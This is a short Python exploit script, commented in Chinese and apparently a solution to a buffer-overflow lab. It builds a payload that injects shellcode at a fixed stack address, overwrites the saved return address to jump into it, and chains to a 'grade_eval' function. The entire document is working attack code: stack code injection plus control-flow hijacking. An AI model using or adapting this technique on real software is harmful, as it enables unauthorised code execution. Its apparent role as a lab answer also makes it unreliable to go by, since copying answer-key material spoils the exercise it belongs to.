import sys, struct

BUFFER = 0x721000800fd0          # 固定栈上 expression 的地址（GDB: p/x $rbp-0x10）

sc  = b"\xbf\x04\x00\x00\x00"    # mov $0x4,%edi
sc += b"\xc3"                    # ret -> 从栈上弹出下一个 qword 跳过去

payload  = sc.ljust(0x18, b"A")            # shellcode + 填充到返回地址
payload += struct.pack("<Q", BUFFER)       # 返回地址改成缓冲区 -> 跳回栈上执行
payload += struct.pack("<Q", 0x401a87)     # shellcode 的 ret 弹出：grade_eval

sys.stdout.buffer.write(payload)
